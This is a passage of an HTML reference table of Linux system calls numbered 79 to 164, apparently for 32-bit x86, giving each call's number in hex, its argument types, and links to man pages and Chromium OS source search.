*tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">79</td><td>settimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td><td align="center">0x4f</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">80</td><td>getgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td><td align="center">0x50</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">81</td><td>setgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td><td align="center">0x51</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">82</td><td>select</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/select.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*select">cs/</a></td><td align="center">0x52</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timeval *tvp</td><td>-</td></tr><tr><td align="center">83</td><td>symlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlink">cs/</a></td><td align="center">0x53</td><td>const char *old</td><td>const char *new</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">84</td><td>oldlstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/oldlstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*oldlstat">cs/</a></td><td align="center">0x54</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">85</td><td>readlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlink">cs/</a></td><td align="center">0x55</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">86</td><td>uselib</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uselib.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uselib">cs/</a></td><td align="center">0x56</td><td>const char *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">87</td><td>swapon</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td><td align="center">0x57</td><td>const char *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">88</td><td>reboot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td><td align="center">0x58</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td>-</td><td>-</td></tr><tr><td align="center">89</td><td>readdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readdir">cs/</a></td><td align="center">0x59</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">90</td><td>mmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap">cs/</a></td><td align="center">0x5a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">91</td><td>munmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td><td align="center">0x5b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">92</td><td>truncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td><td align="center">0x5c</td><td>const char *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">93</td><td>ftruncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td><td align="center">0x5d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">94</td><td>fchmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td><td align="center">0x5e</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">95</td><td>fchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td><td align="center">0x5f</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">96</td><td>getpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td><td align="center">0x60</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">97</td><td>setpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td><td align="center">0x61</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">98</td><td>profil</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/profil.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*profil">cs/</a></td><td align="center">0x62</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">99</td><td>statfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td><td align="center">0x63</td><td>const char * path</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">100</td><td>fstatfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td><td align="center">0x64</td><td>unsigned int fd</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">101</td><td>ioperm</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioperm.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioperm">cs/</a></td><td align="center">0x65</td><td>unsigned long from</td><td>unsigned long num</td><td>int on</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">102</td><td>socketcall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketcall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketcall">cs/</a></td><td align="center">0x66</td><td>int call</td><td>unsigned long *args</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">103</td><td>syslog</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td><td align="center">0x67</td><td>int type</td><td>char *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">104</td><td>setitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td><td align="center">0x68</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">105</td><td>getitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td><td align="center">0x69</td><td>int which</td><td>struct itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">106</td><td>stat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat">cs/</a></td><td align="center">0x6a</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">107</td><td>lstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat">cs/</a></td><td align="center">0x6b</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">108</td><td>fstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td><td align="center">0x6c</td><td>unsigned int fd</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">109</td><td>olduname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/olduname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*olduname">cs/</a></td><td align="center">0x6d</td><td>struct oldold_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">110</td><td>iopl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/iopl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*iopl">cs/</a></td><td align="center">0x6e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">111</td><td>vhangup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td><td align="center">0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">112</td><td>idle</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/idle.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*idle">cs/</a></td><td align="center">0x70</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">113</td><td>vm86old</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vm86old.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vm86old">cs/</a></td><td align="center">0x71</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">114</td><td>wait4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td><td align="center">0x72</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td>-</td><td>-</td></tr><tr><td align="center">115</td><td>swapoff</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td><td align="center">0x73</td><td>const char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">116</td><td>sysinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td><td align="center">0x74</td><td>struct sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">117</td><td>ipc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ipc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ipc">cs/</a></td><td align="center">0x75</td><td>unsigned int call</td><td>int first</td><td>unsigned long second</td><td>unsigned long third</td><td>void *ptr</td><td>long fifth</td></tr><tr><td align="center">118</td><td>fsync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td><td align="center">0x76</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">119</td><td>sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigreturn">cs/</a></td><td align="center">0x77</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">120</td><td>clone</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td><td align="center">0x78</td><td>unsigned long</td><td>unsigned long</td><td>int *</td><td>int *</td><td>unsigned long</td><td>-</td></tr><tr><td align="center">121</td><td>setdomainname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td><td align="center">0x79</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">122</td><td>uname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td><td align="center">0x7a</td><td>struct old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">123</td><td>modify_ldt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/modify_ldt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*modify_ldt">cs/</a></td><td align="center">0x7b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">124</td><td>adjtimex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td><td align="center">0x7c</td><td>struct __kernel_timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">125</td><td>mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td><td align="center">0x7d</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">126</td><td>sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigprocmask">cs/</a></td><td align="center">0x7e</td><td>int how</td><td>old_sigset_t *set</td><td>old_sigset_t *oset</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">127</td><td>create_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/create_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*create_module">cs/</a></td><td align="center">0x7f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">128</td><td>init_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td><td align="center">0x80</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">129</td><td>delete_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td><td align="center">0x81</td><td>const char *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">130</td><td>get_kernel_syms</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_kernel_syms.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_kernel_syms">cs/</a></td><td align="center">0x82</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">131</td><td>quotactl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td><td align="center">0x83</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td>-</td><td>-</td></tr><tr><td align="center">132</td><td>getpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td><td align="center">0x84</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">133</td><td>fchdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td><td align="center">0x85</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">134</td><td>bdflush</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bdflush.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bdflush">cs/</a></td><td align="center">0x86</td><td>int func</td><td>long data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">135</td><td>sysfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysfs">cs/</a></td><td align="center">0x87</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">136</td><td>personality</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td><td align="center">0x88</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">137</td><td>afs_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/afs_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*afs_syscall">cs/</a></td><td align="center">0x89</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">138</td><td>setfsuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td><td align="center">0x8a</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">139</td><td>setfsgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td><td align="center">0x8b</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">140</td><td>_llseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_llseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_llseek">cs/</a></td><td align="center">0x8c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">141</td><td>getdents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents">cs/</a></td><td align="center">0x8d</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">142</td><td>_newselect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_newselect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_newselect">cs/</a></td><td align="center">0x8e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">143</td><td>flock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td><td align="center">0x8f</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">144</td><td>msync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td><td align="center">0x90</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">145</td><td>readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td><td align="center">0x91</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">146</td><td>writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td><td align="center">0x92</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">147</td><td>getsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td><td align="center">0x93</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">148</td><td>fdatasync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td><td align="center">0x94</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">149</td><td>_sysctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_sysctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_sysctl">cs/</a></td><td align="center">0x95</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">150</td><td>mlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td><td align="center">0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">151</td><td>munlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td><td align="center">0x97</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">152</td><td>mlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td><td align="center">0x98</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">153</td><td>munlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td><td align="center">0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">154</td><td>sched_setparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td><td align="center">0x9a</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">155</td><td>sched_getparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td><td align="center">0x9b</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">156</td><td>sched_setscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td><td align="center">0x9c</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">157</td><td>sched_getscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td><td align="center">0x9d</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">158</td><td>sched_yield</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td><td align="center">0x9e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">159</td><td>sched_get_priority_max</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td><td align="center">0x9f</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">160</td><td>sched_get_priority_min</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td><td align="center">0xa0</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">161</td><td>sched_rr_get_interval</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td><td align="center">0xa1</td><td>pid_t pid</td><td>struct __kernel_timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">162</td><td>nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td><td align="center">0xa2</td><td>struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">163</td><td>mremap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td><td align="center">0xa3</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td></tr><tr><td align="center">164</td><td>setresuid</td><td align="center"><a 